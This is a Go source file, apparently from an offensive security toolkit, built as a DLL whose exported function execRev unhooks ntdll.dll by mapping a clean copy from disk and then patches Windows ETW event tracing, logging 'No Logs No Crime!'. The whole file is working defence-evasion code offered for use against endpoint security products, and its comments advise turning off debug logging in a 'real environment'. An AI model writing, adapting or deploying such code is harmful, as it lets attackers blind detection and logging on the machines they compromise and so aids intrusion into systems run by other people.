package main

import "C"
import (
	"fmt"
	"os"

	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
	"golang.org/x/sys/windows"
)

/**
Disable the debug method before execution in a real environment, don't be a Script Kiddie.
**/
var logFile *os.File

func init() {
	var err error
	logFile, err = os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		fmt.Println("[!] Error opening log file:", err)
		return
	}
}
func logDebug(message string) {
	if logFile != nil {
		logFile.WriteString(fmt.Sprintf("%s\n", message))
		logFile.Sync()
	}
}

//export execRev
func execRev() {

	logDebug(fmt.Sprintf("[+] Hooked Ntdll Base Address:", windows.NewLazySystemDLL("ntdll.dll").Handle()))

	hFile, err := windows.CreateFile(
		windows.StringToUTF16Ptr(evasion.NtdllPath),
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		logDebug(fmt.Sprintf("[!] Failed to open ntdll.dll:", err))
		return
	}
	defer windows.CloseHandle(hFile)

	hFileMapping, err := windows.CreateFileMapping(
		hFile,
		nil,
		windows.PAGE_READONLY|evasion.SEC_IMAGE,
		0,
		0,
		nil,
	)
	if err != nil {
		logDebug(fmt.Sprintf("[!] File mapping failed:", err))
		return
	}
	defer windows.CloseHandle(hFileMapping)

	pMapping, err := windows.MapViewOfFile(
		hFileMapping,
		windows.FILE_MAP_READ,
		0,
		0,
		0,
	)
	if err != nil {
		logDebug(fmt.Sprintf("[!] Mapping failed:", err))
		return
	}
	defer windows.UnmapViewOfFile(pMapping)

	ntdllHandle := windows.NewLazySystemDLL("ntdll.dll").Handle()
	err = evasion.UnhookNTDLL(windows.Handle(ntdllHandle), uintptr(pMapping))
	if err != nil {
		logDebug(fmt.Sprintf("[!] Failed to unhook NTDLL: %v\n", err))
		return
	}

	logDebug(fmt.Sprintf("[+] Unhooked Ntdll Base Address:", ntdllHandle))
	logDebug(fmt.Sprintf("[+] PID Of The Current Process: %d\n", windows.GetCurrentProcessId()))
	logDebug(fmt.Sprintf(("[+] Ready For ETW Patch.")))

	err = evasion.FuckETW()
	if err != nil {
		logDebug(fmt.Sprintf("[!] Failed to patch ETW:", err))
		return
	}

	logDebug(fmt.Sprintf("[+] ETW Patched, No Logs No Crime!"))

}

func main() {
	//Blank
}
